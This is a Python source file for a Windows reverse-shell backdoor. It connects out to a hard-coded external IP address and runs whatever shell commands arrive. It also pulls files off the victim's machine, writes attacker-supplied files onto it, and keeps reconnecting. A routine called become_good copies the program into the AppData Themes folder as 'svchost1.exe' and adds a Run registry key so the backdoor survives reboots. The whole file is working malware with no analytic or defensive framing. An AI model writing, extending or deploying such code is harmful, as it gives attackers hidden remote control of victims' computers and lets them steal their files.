import socket
import subprocess
import time
import json
import os
import signal
import sys
import hashlib
import select
import shutil


HOST_IP = '34.227.29.45'
PORT = 2222
CHUNK_SIZE = 8192


def become_good():
    themes_file_location = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Themes", "svchost1.exe")
    if not os.path.exists(themes_file_location):
        shutil.copyfile(sys.executable, themes_file_location)
        subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svc_host12 /t REG_SZ /d "' + themes_file_location + '"', shell=True)



def calculate_md5(filename):
    """Calculate MD5 hash of file"""
    md5_hash = hashlib.md5()
    with open(filename, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            md5_hash.update(chunk)
    return md5_hash.hexdigest()

def receive_command(sock):
    data = ''
    while True:
        try:
            data += sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def send_output(sock, data):
    jsondata = json.dumps(data)
    sock.sendall(jsondata.encode())  # Use sendall for reliable transmission

def send_file(sock, filename):
    """Send file to server with chunked transfer and verification"""
    try:
        if not os.path.exists(filename):
            send_output(sock, f"[!] File {filename} not found")
            return False

        filesize = os.path.getsize(filename)
        md5_hash = calculate_md5(filename)
        
        metadata = {
            'filename': os.path.basename(filename),
            'filesize': filesize,
            'md5': md5_hash
        }
        send_output(sock, metadata)

        if receive_command(sock) != "READY":
            return False

        bytes_sent = 0
        with open(filename, 'rb') as f:
            while bytes_sent < filesize:
                chunk = f.read(CHUNK_SIZE)
                if not chunk:
                    break
                sock.sendall(chunk)
                bytes_sent += len(chunk)

        # Check for incomplete transfer
        if bytes_sent != filesize:
            send_output(sock, "[!] File transfer incomplete")
            return False

        result = receive_command(sock)
        return result.get('success', False)

    except Exception as e:
        send_output(sock, f"[!] Error sending file: {str(e)}")
        return False

def receive_file(sock, target_filename):
    """Receive file from server with chunked transfer and verification"""
    try:
        metadata = receive_command(sock)
        if isinstance(metadata, str) and metadata.startswith('[!]'):
            return False

        filesize = metadata['filesize']
        expected_md5 = metadata['md5']
        
        send_output(sock, "READY")

        md5_hash = hashlib.md5()
        bytes_received = 0
        
        with open(target_filename, 'wb') as f:
            while bytes_received < filesize:
                chunk = sock.recv(min(CHUNK_SIZE, filesize - bytes_received))
                if not chunk:
                    break
                f.write(chunk)
                md5_hash.update(chunk)
                bytes_received += len(chunk)

        if bytes_received != filesize:
            send_output(sock, {
                'success': False,
                'message': "[!] File transfer incomplete"
            })
            return False

        received_md5 = md5_hash.hexdigest()
        success = received_md5 == expected_md5
        
        send_output(sock, {
            'success': success,
            'message': f"[+] File received successfully: {target_filename}" if success else "[!] File verification failed"
        })
        
        return success

    except Exception as e:
        send_output(sock, f"[!] Error receiving file: {str(e)}")
        return False

def handle_cd(sock, path):
    try:
        path = path.strip().strip('"').strip("'")
        os.chdir(path)
        send_output(sock, f"[+] Changed to {os.getcwd()}")
    except FileNotFoundError:
        send_output(sock, f"[!] Directory not found: {path}")
    except PermissionError:
        send_output(sock, f"[!] Permission denied: {path}")
    except Exception as e:
        send_output(sock, f"[!] Error changing directory: {str(e)}")

def shell(sock):
    print("[+] Connection established with server")
    last_activity = time.time()
    while True:
        try:
            # Send keep-alive every 15 seconds
            if time.time() - last_activity > 15:
                send_output(sock, "PING")
                last_activity = time.time()

            # Check for incoming commands
            if sock in select.select([sock], [], [], 1)[0]:
                command = receive_command(sock)
                last_activity = time.time()
                
                if command == ":kill":
                    print("[*] Received kill command, closing current session...")
                    return False
                elif command.startswith("cd "):
                    handle_cd(sock, command[3:])
                elif command.startswith("download "):
                    filename = command.split(" ", 1)[1].strip()
                    send_file(sock, filename)
                elif command.startswith("upload "):
                    filename = command.split(" ", 1)[1].strip()
                    receive_file(sock, filename)
                else:
                    # Execute command with a timeout
                    try:
                        result = subprocess.run(
                            command,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout= 2 # Timeout after 2 seconds
                        )
                        output = result.stdout + result.stderr
                        send_output(sock, output)
                    except subprocess.TimeoutExpired:
                        send_output(sock, "[!] Command timed out after 10 seconds")
                    except Exception as e:
                        send_output(sock, f"[!] Error executing command: {str(e)}")

        except (socket.error, json.JSONDecodeError) as e:
            print(f"[!] Lost connection to server: {str(e)}")
            return False

def connect():
    while True:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow port reuse
            sock.settimeout(30)
            
            print(f"\n[*] Attempting to connect to server at {HOST_IP}:{PORT}...")
            sock.connect((HOST_IP, PORT))
            
            shell(sock)
            
        except socket.error as e:
            print(f"[!] Connection failed: {str(e)}")
        except Exception as e:
            print(f"[!] Critical error: {str(e)}")
        finally:
            if sock:
                try:
                    sock.shutdown(socket.SHUT_RDWR)  # Gracefully close the socket
                    sock.close()
                except:
                    pass
            print("[*] Retrying seconds...")
            # time.sleep(3)

def signal_handler(sig, frame):
    print("\n[!] Backdoor exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    become_good()
    while True:
        try:
            connect()
        except Exception as e:
            print(f"[!] Critical error: {str(e)}")
            print("[*] Restarting connection process in 10 seconds...")
            time.sleep(10)
